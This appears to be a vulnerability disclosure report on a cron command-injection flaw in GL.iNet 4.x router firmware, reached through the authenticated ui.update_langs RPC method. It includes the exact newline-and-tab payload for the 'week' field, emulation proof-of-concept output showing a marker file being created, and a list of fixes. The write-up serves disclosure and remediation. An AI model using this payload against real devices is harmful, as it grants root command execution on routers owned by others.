# Technical Report

## 1. Overview

`ui.update_langs` in GL.iNet 4.x firmware stores language-update schedule fields into UCI configuration. The `week` value is later consumed by `/etc/init.d/gl_timer` and written directly into the root crontab.

The schedule value is not constrained to numeric weekday fields. A newline can terminate the intended cron row, and tab characters can separate fields in an attacker-controlled second cron row.

## 2. Authentication Boundary

The vulnerable method is reached through the authenticated JSON-RPC wrapper:

```text
call -> sid, ui, update_langs, args
```

The reviewed route requires a valid web administrator session. This report does not claim unauthenticated access.

## 3. Validation Weakness

`usr/share/gl-validator.d/ui.lua` only defines method-specific validation for `init`; it does not define validation for `update_langs`.

When no method-specific validator exists, `usr/lib/lua/oui/rpc.lua` falls back to:

```lua
vt = vt or '^[%w%.%s%-_:#/]-$'
```

The `%s` class permits newline and tab characters. The other required payload characters are also accepted by the default character class.

## 4. Source Evidence

The `ui.update_langs` bytecode shows the method storing caller-controlled fields:

```text
hour   = args.hour
min    = args.min
week   = args.week
enable = args.enable

uci set gl_timer.langs.enable = "1"
uci set gl_timer.langs.hour   = hour
uci set gl_timer.langs.min    = min
uci set gl_timer.langs.week   = table.concat(week, " ")
commit gl_timer
spawn /etc/init.d/gl_timer restart
```

The schedule fields are not normalized to numeric ranges before persistence.

## 5. Sink Evidence

`/etc/init.d/gl_timer` contains:

```sh
convert_langs_to_crond() {
    config_get enable $1 enable
    if [ "$enable" != 1 ]; then
        return
    fi

    config_get min $1 min
    config_get hour $1 hour
    local week=`uci -q get gl_timer.$1.week | sed 's/ /,/g'`
    if [ -n "$min" -a -n "$hour" -a -n "$week" ];then
        echo "$min $hour * * $week gl_timer_control_langs 1 $week $hour $min" >> /tmp/gl_crontabs/crontabs.d/langs
    fi
}
```

The only transformation is `sed 's/ /,/g'`, which replaces ASCII spaces. It does not remove newlines or tabs.

## 6. Exploit Strategy

A valid malicious `week` value is:

```text
1\n0-59\t0-23\t1-31\t1-12\t0-6\ttouch\t/tmp/glinet_ui_timer_pwn\t#
```

The intended cron entry begins as:

```text
0 0 * * 1
```

The newline starts a second attacker-controlled row:

```text
0-59 0-23 1-31 1-12 0-6 touch /tmp/glinet_ui_timer_pwn # ...
```

Cron treats tabs as field separators, so the second row executes `touch /tmp/glinet_ui_timer_pwn`.

## 7. Dynamic Verification

### 7.1 Lua RPC Harness

The stronger QEMU harness:

```text
poc/verify_glinet_ui_update_langs_rpc_lua_cron_cmdi_2026_07_07.sh
```

loads:

- the real `usr/share/gl-validator.d/ui.lua` validator;
- the real `usr/lib/oui-httpd/rpc/ui` Lua RPC module;
- the firmware `uci` Lua module under `qemu-aarch64`;
- minimal `ngx`, `ubus`, and filesystem stubs needed to run the Lua module outside nginx.

It confirms the malicious argument passes validation and reaches `ui.update_langs`:

```text
VALIDATOR_RC=0
NGX_SPAWN=/etc/init.d/gl_timer restart
```

It then confirms cron injection and command execution:

```text
--- generated cron ---
0 0 * * 1$
0-59\t0-23\t1-31\t1-12\t0-6\ttouch\t/tmp/glinet_ui_rpc_timer_pwn\t# gl_timer_control_langs 1 1$

MARKER_CREATED=/tmp/glinet_ui_rpc_timer_pwn
```

Full captured output:

```text
evidence/verify_qemu_lua_rpc_update_langs_cron_cmdi_output.txt
```

### 7.2 Rootfs Cron Harness

The secondary QEMU/rootfs probe:

```text
poc/verify_glinet_ui_update_langs_gl_timer_cron_cmdi_2026_07_07.sh
```

performs the following:

1. Copies the firmware `gl_timer` UCI config to a temporary directory.
2. Uses the firmware `sbin/uci` under `qemu-aarch64` to persist the malicious `gl_timer.langs.week` value.
3. Recreates the vulnerable cron-generation logic from `/etc/init.d/gl_timer`.
4. Extracts and executes the injected cron command line as cron would.

Key observed output:

```text
--- uci get week ---
1$
0-59\t0-23\t1-31\t1-12\t0-6\ttouch\t/tmp/glinet_ui_timer_pwn\t#$

--- generated cron ---
0 0 * * 1$
0-59\t0-23\t1-31\t1-12\t0-6\ttouch\t/tmp/glinet_ui_timer_pwn\t# gl_timer_control_langs 1 1$

MARKER_CREATED=/tmp/glinet_ui_timer_pwn
```

This second harness validates the persistence and cron-generation boundary independently of the Lua RPC method call.

## 8. Affected Local Firmware

- `GL-MT3000` firmware `4.8.1`: `ui.update_langs` and `gl_timer` sink observed statically.
- `GL-MT6000` firmware `4.9.0`: static source-to-sink evidence and QEMU/rootfs dynamic proof.
- `GL-X3000` firmware `4.8.3`: `ui.update_langs` and `gl_timer` sink observed statically.

## 9. Recommended Fix

- Add a strict validator for `ui.update_langs`.
- Treat `week` as an array of integers in `0..6` only.
- Treat `hour` as an integer in `0..23` and `min` as an integer in `0..59`.
- Reject control characters and all whitespace except expected JSON structural separators.
- Generate cron files using validated numeric fields only.
- Prefer writing cron fields from parsed numeric values, not from raw RPC strings.
